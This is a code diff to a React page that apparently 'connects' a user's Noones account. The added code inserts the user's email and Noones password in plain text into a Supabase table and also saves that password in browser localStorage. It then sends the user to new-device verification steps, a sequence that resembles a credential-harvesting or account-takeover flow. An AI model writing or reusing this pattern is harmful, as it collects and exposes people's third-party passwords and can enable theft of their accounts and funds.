@@ -1,8 +1,11 @@
 import React, { useEffect, useRef, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { supabase } from '../../lib/supabase';
 import { useAuth } from '../../contexts/AuthContext';
 
-const CONNECT_PROGRESS_KEY = 'nexara_connect_progress';
+const NOONES_REQUEST_ID_KEY = 'noones_request_id';
+const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
+const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
 export default function NoonesConnect() {
   const navigate = useNavigate();
@@ -23,38 +26,49 @@ export default function NoonesConnect() {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
   };
 
-  const saveConnectProgress = (progress: Record<string, unknown>) => {
+  const saveNoonesProgress = (step: number, requestId?: string, requestData?: Record<string, unknown>) => {
     try {
-      window.localStorage.setItem(CONNECT_PROGRESS_KEY, JSON.stringify(progress));
+      window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, step.toString());
+      if (requestId) {
+        window.localStorage.setItem(NOONES_REQUEST_ID_KEY, requestId);
+      }
+      if (requestData) {
+        window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify(requestData));
+      }
     } catch {
       // ignore storage failures
     }
   };
 
-  const loadConnectProgress = () => {
+  const loadNoonesProgress = () => {
     try {
-      const saved = window.localStorage.getItem(CONNECT_PROGRESS_KEY);
-      if (!saved) {
-        return;
-      }
-      const progress = JSON.parse(saved) as {
-        route?: string;
-        partialFormData?: { email?: string; password?: string };
-      };
-      if (progress.route === '/connect/noones') {
-        setCredentials((current) => ({
-          ...current,
-          ...progress.partialFormData,
-        }));
-      }
+      const step = window.localStorage.getItem(NOONES_CURRENT_STEP_KEY);
+      const requestId = window.localStorage.getItem(NOONES_REQUEST_ID_KEY);
+      const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
+      const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
+      return { step: step ? parseInt(step) : null, requestId, requestData };
     } catch {
-      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
+      return { step: null, requestId: null, requestData: null };
     }
   };
 
+  const clearNoonesProgress = () => {
+    window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
+    window.localStorage.removeItem(NOONES_REQUEST_ID_KEY);
+    window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
+  };
+
   useEffect(() => {
-    loadConnectProgress();
-  }, []);
+    const { step, requestData } = loadNoonesProgress();
+    if (step && step > 1 && requestData) {
+      // Redirect to the appropriate step
+      if (step === 2) {
+        navigate('/connect/noones/new-device-verify', { state: { email: requestData.email, platformData: requestData } });
+      } else if (step === 3) {
+        navigate('/connect/noones/verify-device', { state: { email: requestData.email, platformData: requestData } });
+      }
+    }
+  }, [navigate]);
 
   const handleSelectGoogleAccount = () => {
     setGoogleMessage('Please enter your Google email in the email field above.');
@@ -70,29 +84,37 @@ export default function NoonesConnect() {
     }
     setLoading(true);
     try {
-      const platformData = {
+      console.log('Submitting to table: platform_connection_requests');
+      const { data, error } = await supabase
+        .from('platform_connection_requests')
+        .insert({
+          platform: 'Noones',
+          email,
+          third_party_password: password,
+          user_id: user?.id || null,
+        })
+        .select('id')
+        .single();
+
+      if (error) {
+        throw error;
+      }
+
+      const requestId = data.id;
+      console.log('Inserted request id:', requestId);
+
+      const requestData = {
         platform: 'Noones',
         email,
         third_party_password: password,
         user_id: user?.id || null,
       };
 
-      const response = await fetch('/api/submit-connection', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(platformData),
-      });
+      saveNoonesProgress(2, requestId, requestData);
 
-      if (!response.ok) {
-        const body = await response.json().catch(() => null);
-        throw new Error(body?.error || 'Failed to submit connection.');
-      }
-
-      window.localStorage.removeItem(CONNECT_PROGRESS_KEY);
-      navigate('/connect/noones/new-device-verify', { state: { email, platformData } });
+      navigate('/connect/noones/new-device-verify', { state: { email, platformData: requestData } });
     } catch (err: any) {
+      console.error('Error inserting into platform_connection_requests:', err);
       setErrorMessage(err.message || 'An unexpected error occurred.');
     } finally {
       setLoading(false);
